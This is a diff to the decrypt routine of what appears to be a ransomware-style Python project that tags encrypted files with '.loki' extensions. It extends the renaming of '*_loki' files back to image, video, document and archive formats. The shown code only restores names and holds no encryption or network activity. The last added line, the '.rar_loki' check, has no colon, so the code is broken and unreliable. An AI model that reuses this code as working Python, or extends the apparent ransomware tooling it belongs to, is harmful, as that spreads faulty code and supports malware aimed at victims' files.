@@ -65,15 +65,46 @@ def decrypt():
             base_file, ext = os.path.splitext(filename) # Reverses loki extension manipulation.
             if ext == ".loki":
                 os.rename(filename, base_file + "")
-            if ext == ".txt_loki":
-                os.rename(filename, base_file + ".txt")
-            if ext == ".doc_loki":
-                os.rename(filename, base_file + ".doc")
+            if ext == ".png_loki": # Image formats.
+                os.rename(filename, base_file + ".png")
             if ext == ".jpg_loki":
                 os.rename(filename, base_file + ".jpg")
-            if ext == ".png_loki":
-                os.rename(filename, base_file + ".png")
-#        print(f"\n[!] {Fore.YELLOW}Errno2 {Fore.WHITE} - This is a bug and can be ignored")
+            if ext == ".jpeg_loki":
+                os.rename(filename, base_file + ".jpeg")
+            if ext == ".gif_loki":
+                os.rename(filename, base_file + ".gif")
+            if ext == ".tiff_loki":
+                os.rename(filename, base_file + ".tiff")
+            if ext == ".bmp_loki":
+                os.rename(filename, base_file + ".bmp")
+            if ext == ".svg_loki":
+                os.rename(filename, base_file + ".svg")
+            if ext == ".heif_loki":
+                os.rename(filename, base_file + ".heif")
+            if ext == ".raw_loki":
+                os.rename(filename, base_file + ".raw")
+            if ext == ".mp4_loki": # Video formats.
+                os.rename(filename, base_file + ".mp4")
+            if ext == ".wav_loki":
+                os.rename(filename, base_file + ".wav")
+            if ext == ".doc_loki": # Document formats.
+                os.rename(filename, base_file + ".doc")
+            if ext == ".docx_loki":
+                os.rename(filename, base_file + ".docx")
+            if ext == ".odt_loki":
+                os.rename(filename, base_file + ".odt")
+            if ext == ".rtf_loki":
+                os.rename(filename, base_file + ".rtf")
+            if ext == ".tex_loki":
+                os.rename(filename, base_file + ".tex")
+            if ext == ".txt_loki":
+                os.rename(filename, base_file + ".txt")
+            if ext == ".pdf_loki":
+                os.rename(filename, base_file + ".pdf")
+            if ext == ".zip_loki": # Archive formats.
+                os.rename(filename, base_file + ".zip")
+            if ext == ".rar_loki"
+                os.rename(filename, base_file + ".rar")
 
 def decryptor():
     # Find files in current dir, and sub dirs
